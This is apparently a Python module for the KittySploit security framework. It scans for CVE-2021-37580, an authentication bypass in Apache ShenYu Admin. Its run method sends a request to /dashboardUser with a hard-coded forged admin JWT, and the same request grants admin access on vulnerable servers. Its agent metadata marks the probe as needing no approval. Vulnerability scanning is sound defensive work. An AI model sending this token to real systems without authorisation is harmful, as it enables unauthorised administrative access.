#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Apache ShenYu 2."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Apache ShenYu Admin JWT - Authentication Bypass Detection',
        'description': 'Apache ShenYu 2.3.0 and 2.4.0 allow Admin access without proper authentication. The incorrect use of JWT in ShenyuAdminBootstrap allows an attacker to bypass authentication.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve2021', 'cve', 'apache', 'jwt', 'shenyu', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://nvd.nist.gov/vuln/detail/CVE-2021-37580',
            'https://github.com/fengwenhua/CVE-2021-37580',
            'https://lists.apache.org/thread/o15j25qwtpcw62k48xw1tnv48skh3zgb',
            'http://www.openwall.com/lists/oss-security/2021/11/16/1',
            'https://github.com/ARPSyndicate/kenzer-templates',
        ],
        'cve': 'CVE-2021-37580',
    }

    def run(self):
        path = '/dashboardUser'
        r = self.http_request(method='GET', path=path, allow_redirects=False, headers={'X-Access-Token': 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyTmFtZSI6ImFkbWluIiwiZXhwIjoxNjM3MjY1MTIxfQ.-jjw2bGyQxna5Soe4fLVLaD3gUT5ALTcsvutPQoE2qk'})
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('query success', '"userName":"admin"', '"code":200',)
        if all(m in body for m in body_all):
            self.set_info(severity='critical', reason='Apache ShenYu Admin JWT - Authentication Bypass detected', path=path)
            return True
        return False

